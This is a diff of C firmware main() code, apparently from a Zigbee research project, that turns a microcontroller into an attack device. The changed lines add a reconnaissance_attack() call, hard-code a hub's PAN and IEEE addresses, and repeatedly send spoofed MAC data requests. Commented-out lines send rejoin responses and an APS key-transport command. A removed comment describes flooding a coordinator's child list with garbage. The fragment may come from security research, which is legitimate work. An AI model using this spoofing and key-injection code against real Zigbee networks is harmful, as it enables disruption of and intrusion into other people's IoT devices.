@@ -58,21 +58,20 @@ int main(void)
 	MCUCR = 0;
 #endif
 
-	/* Workflow:
-	* 1. First set rejoin_flag to 1, trying to filling up ZC's child list with garbage.
-	* 2. Set Rejoin_flag = 3, and modify the code in blocks which (rejoin_flag == 1), to set delay_ms(10000). Then jump into Rejoin_flag 1 (Sending the last garbage).
-	* 3. After that, just to board_app.c, we handle IMQ interrupt there, for further beacon request/rejoin request/data request handling.
-	*/
 	sei();
-	uint8_t rejoin_flag = 4;
-
 	_delay_ms(3000);
 
+	
+
+	// TODO: Here we need to implement Reconnaissance Attack first to determine device types and device address in the netwrok.
+	reconnaissance_attack();
+
 	/** TEST FIELD **/
-	rejoin_flag = 1;
+
+	uint8_t attack_no = 1;
 	// Here we let dst_device = hub, src_device = sensor to test our API
 	ieee802154_addr hub_addr = {};
-	hub_addr.pan = 0x3412;
+	hub_addr.pan = 0x2ca2;
 	hub_addr.epan = 0x0ab4da5c2ea6d3ec;
 	hub_addr.short_addr = 0x0000;
 	hub_addr.long_addr = 0x286d970002054a14;
@@ -91,23 +90,19 @@ int main(void)
 	aack_config.target_pan_id.addr = hub_addr.pan;
 
 	/** END OF TEST FIELD **/
+
 	while (1)
 	{
-		if (rejoin_flag == 1)
+		if (attack_no == 1)
 		{
 			_delay_ms(2000);
 			led(1);
-			// send_zbee_cmd(ZBEE_MAC_CMD_DATA_RQ, 0, &sensor_addr, &hub_addr, &aack_config);
+			send_zbee_cmd(ZBEE_MAC_CMD_DATA_RQ, 0, &hub_addr, &sensor_addr, &aack_config);
 			// send_zbee_cmd(ZBEE_MAC_CMD_BEACON_RQ, 0, &sensor_addr, &hub_addr, &aack_config);
 			// send_zbee_cmd(ZBEE_MAC_CMD_BEACON_RP, 0, &sensor_addr, &hub_addr, &aack_config);
-			// send_zbee_cmd(ZBEE_NWK_CMD_REJOIN_RQ, 0, &sensor_addr, &hub_addr, &aack_config);
-			send_zbee_cmd(ZBEE_NWK_CMD_REJOIN_RP, 0, &sensor_addr, &hub_addr, &aack_config);
-			_delay_ms(2000);
-			led(0);
-
-			_delay_ms(2000);
-			led(1);
-			send_zbee_cmd(ZBEE_APS_CMD_KEY_TRANSPORT, 1, &sensor_addr, &hub_addr, &aack_config);
+			// send_zbee_cmd(ZBEE_NWK_CMD_REJOIN_RQ, 0, &hub_addr, &sensor_addr, &aack_config);
+			// send_zbee_cmd(ZBEE_NWK_CMD_REJOIN_RP, 0, &sensor_addr, &hub_addr, &aack_config);
+			// send_zbee_cmd(ZBEE_APS_CMD_KEY_TRANSPORT, 1, &sensor_addr, &hub_addr, &aack_config);
 			_delay_ms(2000);
 			led(0);
 		}
